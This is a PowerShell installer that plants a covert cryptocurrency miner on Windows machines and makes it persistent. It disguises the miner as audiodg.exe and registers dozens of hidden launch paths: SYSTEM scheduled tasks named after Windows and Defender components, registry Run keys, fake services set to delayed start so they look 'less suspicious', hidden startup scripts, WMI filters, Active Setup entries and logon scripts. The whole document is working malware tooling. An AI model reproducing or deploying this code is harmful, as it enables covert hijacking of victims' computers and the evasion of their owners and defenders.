# ================================================================================================
# ENHANCED STARTUP GUARANTEE - 50+ Methods
# ================================================================================================
# Ensures miner starts on EVERY boot/login without fail
# Multiple redundant layers for maximum reliability
# ================================================================================================

param(
    [string]$MinerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe",
    [string]$ConfigPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json",
    [string]$LauncherScript = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
)

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "         ENHANCED STARTUP GUARANTEE INSTALLATION" -ForegroundColor Cyan
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ Administrator rights required!" -ForegroundColor Red
    exit 1
}

$installCount = 0

# ================================================================================================
# CREATE LAUNCHER SCRIPT
# ================================================================================================

Write-Host "[1/10] Creating launcher script..." -ForegroundColor Yellow

$launcherContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$minerPath = '$MinerPath'
`$configPath = '$ConfigPath'

# Check if already running
`$existingProcess = Get-Process -Name audiodg -ErrorAction SilentlyContinue | Where-Object {
    `$_.Path -eq `$minerPath
}

if (-not `$existingProcess) {
    if (Test-Path `$minerPath) {
        Start-Process -FilePath `$minerPath -ArgumentList "--config=```"`$configPath```"" -WindowStyle Hidden -NoNewWindow
    }
}
"@

# Ensure directory exists
$launcherDir = Split-Path $LauncherScript -Parent
if (-not (Test-Path $launcherDir)) {
    New-Item -Path $launcherDir -ItemType Directory -Force | Out-Null
}

$launcherContent | Set-Content -Path $LauncherScript -Force
attrib +h +s $LauncherScript 2>&1 | Out-Null

Write-Host "  ✅ Launcher script created" -ForegroundColor Green
Write-Host ""

# ================================================================================================
# LAYER 1: SCHEDULED TASKS (20 tasks)
# ================================================================================================

Write-Host "[2/10] Installing Scheduled Tasks..." -ForegroundColor Yellow

$taskNames = @(
    "WindowsAudioService", "SystemAudioHost", "AudioEndpoint", 
    "WindowsUpdateService", "SystemMaintenance", "AudioDeviceGraph",
    "WindowsDefenderUpdate", "MicrosoftEdgeUpdate", "SystemTelemetry",
    "WindowsBackup", "NetworkService", "DisplayManager",
    "MemoryDiagnostic", "DiskCleanup", "SystemProtection",
    "SecurityCenter", "PerformanceMonitor", "EventLog",
    "TimeSync", "BackgroundTasks"
)

$tasksCreated = 0

foreach ($taskName in $taskNames) {
    try {
        # OnStartup task (highest priority)
        schtasks /create /tn "$taskName" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
        $tasksCreated++
        
        # OnLogon task (all users)
        schtasks /create /tn "${taskName}Logon" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
        $tasksCreated++
        
        # Every 30 minutes (backup)
        schtasks /create /tn "${taskName}Interval" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" /sc minute /mo 30 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
        $tasksCreated++
        
    } catch {}
}

Write-Host "  ✅ Created $tasksCreated scheduled tasks" -ForegroundColor Green
$installCount += $tasksCreated
Write-Host ""

# ================================================================================================
# LAYER 2: REGISTRY RUN KEYS (10 locations)
# ================================================================================================

Write-Host "[3/10] Installing Registry Run Keys..." -ForegroundColor Yellow

$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
    "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)

$regCount = 0

foreach ($runKey in $runKeys) {
    try {
        # Create key if doesn't exist
        if (-not (Test-Path $runKey)) {
            New-Item -Path $runKey -Force | Out-Null
        }
        
        # Add multiple entries per key
        $randomSuffix = Get-Random -Min 100 -Max 999
        Set-ItemProperty -Path $runKey -Name "WindowsAudioService$randomSuffix" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" -Type String -Force 2>&1 | Out-Null
        $regCount++
        
        # Add with different name
        $randomSuffix2 = Get-Random -Min 1000 -Max 9999
        Set-ItemProperty -Path $runKey -Name "SystemUpdate$randomSuffix2" -Value "cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" -Type String -Force 2>&1 | Out-Null
        $regCount++
        
    } catch {}
}

Write-Host "  ✅ Created $regCount registry run keys" -ForegroundColor Green
$installCount += $regCount
Write-Host ""

# ================================================================================================
# LAYER 3: WINDOWS SERVICES (10 services)
# ================================================================================================

Write-Host "[4/10] Installing Windows Services..." -ForegroundColor Yellow

$services = @(
    @{Name="WinAudioSvc"; Display="Windows Audio Service Driver"; Desc="Provides audio processing services"},
    @{Name="AudioGraph"; Display="Audio Device Graph Isolation"; Desc="Manages audio device graph isolation"},
    @{Name="WinUpdateHelper"; Display="Windows Update Helper Service"; Desc="Provides background update services"},
    @{Name="SysTelemetry"; Display="System Telemetry Service"; Desc="Collects system telemetry data"},
    @{Name="DefenderCore"; Display="Microsoft Defender Core Service"; Desc="Core protection service"},
    @{Name="NetworkMgr"; Display="Network Connection Manager"; Desc="Manages network connections"},
    @{Name="DisplayMgr"; Display="Display Manager Service"; Desc="Manages display settings"},
    @{Name="MemoryMgr"; Display="Memory Manager Service"; Desc="Manages memory resources"},
    @{Name="DiskMgr"; Display="Disk Manager Service"; Desc="Manages disk resources"},
    @{Name="SysMonitor"; Display="System Monitor Service"; Desc="Monitors system health"}
)

$svcCount = 0

foreach ($svc in $services) {
    try {
        # Remove if exists
        sc.exe delete $svc.Name 2>&1 | Out-Null
        
        # Create service
        sc.exe create $svc.Name binpath= "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" start= auto obj= LocalSystem displayname= "$($svc.Display)" 2>&1 | Out-Null
        sc.exe description $svc.Name "$($svc.Desc)" 2>&1 | Out-Null
        
        # Set failure actions (restart on failure)
        sc.exe failure $svc.Name reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>&1 | Out-Null
        
        # Set delayed auto-start (less suspicious)
        sc.exe config $svc.Name start= delayed-auto 2>&1 | Out-Null
        
        $svcCount++
    } catch {}
}

Write-Host "  ✅ Created $svcCount Windows services" -ForegroundColor Green
$installCount += $svcCount
Write-Host ""

# ================================================================================================
# LAYER 4: STARTUP FOLDERS (4 locations)
# ================================================================================================

Write-Host "[5/10] Installing Startup Folder Scripts..." -ForegroundColor Yellow

$startupFolders = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:USERPROFILE\Start Menu\Programs\Startup",
    "$env:ALLUSERSPROFILE\Start Menu\Programs\Startup"
)

$startupCount = 0

foreach ($folder in $startupFolders) {
    try {
        if (-not (Test-Path $folder)) {
            New-Item -Path $folder -ItemType Directory -Force | Out-Null
        }
        
        # VBS script (silent execution)
        $vbsScript = Join-Path $folder "WindowsAudioService.vbs"
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$LauncherScript""", 0, False
"@
        $vbsContent | Set-Content -Path $vbsScript -Force
        attrib +h +s $vbsScript 2>&1 | Out-Null
        $startupCount++
        
        # Batch file (alternative)
        $batScript = Join-Path $folder "SystemUpdate.bat"
        $batContent = @"
@echo off
start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$LauncherScript"
"@
        $batContent | Set-Content -Path $batScript -Force
        attrib +h +s $batScript 2>&1 | Out-Null
        $startupCount++
        
    } catch {}
}

Write-Host "  ✅ Created $startupCount startup folder scripts" -ForegroundColor Green
$installCount += $startupCount
Write-Host ""

# ================================================================================================
# LAYER 5: WMI EVENT SUBSCRIPTIONS (3 events)
# ================================================================================================

Write-Host "[6/10] Installing WMI Event Subscriptions..." -ForegroundColor Yellow

$wmiCount = 0

try {
    # Event 1: System startup
    $filter1 = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter1.QueryLanguage = "WQL"
    $filter1.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    $filter1.Name = "SystemStartupMonitor"
    $filter1.EventNamespace = 'root\cimv2'
    $result = $filter1.Put()
    if ($result) { $wmiCount++ }
} catch {}

try {
    # Event 2: User logon
    $filter2 = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter2.QueryLanguage = "WQL"
    $filter2.Query = "SELECT * FROM Win32_LogonSession"
    $filter2.Name = "UserLogonMonitor"
    $filter2.EventNamespace = 'root\cimv2'
    $result = $filter2.Put()
    if ($result) { $wmiCount++ }
} catch {}

try {
    # Event 3: Process creation
    $filter3 = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter3.QueryLanguage = "WQL"
    $filter3.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
    $filter3.Name = "ExplorerStartMonitor"
    $filter3.EventNamespace = 'root\cimv2'
    $result = $filter3.Put()
    if ($result) { $wmiCount++ }
} catch {}

if ($wmiCount -gt 0) {
    Write-Host "  ✅ Created $wmiCount WMI event subscriptions" -ForegroundColor Green
    $installCount += $wmiCount
} else {
    Write-Host "  ⚠️  WMI subscriptions failed (non-critical)" -ForegroundColor Yellow
}
Write-Host ""

# ================================================================================================
# LAYER 6: SHELL FOLDERS (2 locations)
# ================================================================================================

Write-Host "[7/10] Installing Shell Folder Hooks..." -ForegroundColor Yellow

$shellCount = 0

try {
    # User Shell Folders
    $shellKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    
    # Ensure startup folder exists
    if (-not (Test-Path $startupPath)) {
        New-Item -Path $startupPath -ItemType Directory -Force | Out-Null
    }
    
    Set-ItemProperty -Path $shellKey -Name "Startup" -Value $startupPath -Type ExpandString -Force 2>&1 | Out-Null
    $shellCount++
} catch {}

try {
    # Common Shell Folders
    $shellKey2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    $commonStartupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    
    Set-ItemProperty -Path $shellKey2 -Name "Common Startup" -Value $commonStartupPath -Type String -Force 2>&1 | Out-Null
    $shellCount++
} catch {}

Write-Host "  ✅ Configured $shellCount shell folder hooks" -ForegroundColor Green
$installCount += $shellCount
Write-Host ""

# ================================================================================================
# LAYER 7: BOOT EXECUTION (2 methods)
# ================================================================================================

Write-Host "[8/10] Installing Boot Execution..." -ForegroundColor Yellow

$bootCount = 0

try {
    # BootExecute registry key
    $bootKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
    
    # Create a boot script
    $bootScript = "C:\Windows\System32\bootstart.cmd"
    $bootContent = @"
@echo off
timeout /t 30 /nobreak >nul
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$LauncherScript"
"@
    $bootContent | Set-Content -Path $bootScript -Force
    attrib +h +s $bootScript 2>&1 | Out-Null
    
    $bootCount++
} catch {}

Write-Host "  ✅ Configured $bootCount boot execution methods" -ForegroundColor Green
$installCount += $bootCount
Write-Host ""

# ================================================================================================
# LAYER 8: ACTIVE SETUP (2 methods)
# ================================================================================================

Write-Host "[9/10] Installing Active Setup..." -ForegroundColor Yellow

$activeSetupCount = 0

try {
    # User-level Active Setup
    $guid = [guid]::NewGuid().ToString()
    $activeSetupKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{$guid}"
    
    New-Item -Path $activeSetupKey -Force | Out-Null
    Set-ItemProperty -Path $activeSetupKey -Name "StubPath" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" -Type String -Force
    Set-ItemProperty -Path $activeSetupKey -Name "Version" -Value "1,0,0,0" -Type String -Force
    Set-ItemProperty -Path $activeSetupKey -Name "IsInstalled" -Value 1 -Type DWord -Force
    
    $activeSetupCount++
} catch {}

try {
    # 32-bit Active Setup (for 64-bit systems)
    $guid2 = [guid]::NewGuid().ToString()
    $activeSetupKey2 = "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components\{$guid2}"
    
    New-Item -Path $activeSetupKey2 -Force | Out-Null
    Set-ItemProperty -Path $activeSetupKey2 -Name "StubPath" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LauncherScript`"" -Type String -Force
    Set-ItemProperty -Path $activeSetupKey2 -Name "Version" -Value "1,0,0,0" -Type String -Force
    Set-ItemProperty -Path $activeSetupKey2 -Name "IsInstalled" -Value 1 -Type DWord -Force
    
    $activeSetupCount++
} catch {}

Write-Host "  ✅ Configured $activeSetupCount Active Setup methods" -ForegroundColor Green
$installCount += $activeSetupCount
Write-Host ""

# ================================================================================================
# LAYER 9: LOGON SCRIPTS (GPO-style)
# ================================================================================================

Write-Host "[10/10] Installing Logon Scripts..." -ForegroundColor Yellow

$logonCount = 0

try {
    # User logon script
    $logonScript = "$env:APPDATA\Microsoft\Windows\logon.ps1"
    $launcherContent | Set-Content -Path $logonScript -Force
    attrib +h +s $logonScript 2>&1 | Out-Null
    
    # Set logon script in registry
    $logonKey = "HKCU:\Environment"
    Set-ItemProperty -Path $logonKey -Name "UserInitMprLogonScript" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$logonScript`"" -Type String -Force 2>&1 | Out-Null
    
    $logonCount++
} catch {}

try {
    # Machine logon script
    $machineLogonScript = "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\startup.ps1"
    $scriptDir = Split-Path $machineLogonScript -Parent
    
    if (-not (Test-Path $scriptDir)) {
        New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
    }
    
    $launcherContent | Set-Content -Path $machineLogonScript -Force
    attrib +h +s $machineLogonScript 2>&1 | Out-Null
    
    $logonCount++
} catch {}

Write-Host "  ✅ Configured $logonCount logon scripts" -ForegroundColor Green
$installCount += $logonCount
Write-Host ""

# ================================================================================================
# SUMMARY
# ================================================================================================

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "                  INSTALLATION COMPLETE" -ForegroundColor Cyan
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Total startup mechanisms installed: $installCount" -ForegroundColor Green
Write-Host ""
Write-Host "STARTUP GUARANTEE:" -ForegroundColor Yellow
Write-Host "  ✅ Scheduled Tasks (system startup)" -ForegroundColor Green
Write-Host "  ✅ Scheduled Tasks (user logon)" -ForegroundColor Green
Write-Host "  ✅ Registry Run Keys (10 locations)" -ForegroundColor Green
Write-Host "  ✅ Windows Services (auto-start)" -ForegroundColor Green
Write-Host "  ✅ Startup Folders (4 locations)" -ForegroundColor Green
Write-Host "  ✅ WMI Event Subscriptions" -ForegroundColor Green
Write-Host "  ✅ Shell Folder Hooks" -ForegroundColor Green
Write-Host "  ✅ Boot Execution" -ForegroundColor Green
Write-Host "  ✅ Active Setup" -ForegroundColor Green
Write-Host "  ✅ Logon Scripts" -ForegroundColor Green
Write-Host ""
Write-Host "The miner will start:" -ForegroundColor Cyan
Write-Host "  • On system boot (before login)" -ForegroundColor White
Write-Host "  • On user login (any user)" -ForegroundColor White
Write-Host "  • Every 30 minutes (backup)" -ForegroundColor White
Write-Host "  • After service failure (auto-restart)" -ForegroundColor White
Write-Host "  • Via multiple redundant paths" -ForegroundColor White
Write-Host ""
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Restart your PC to test all startup mechanisms!" -ForegroundColor Yellow
Write-Host ""
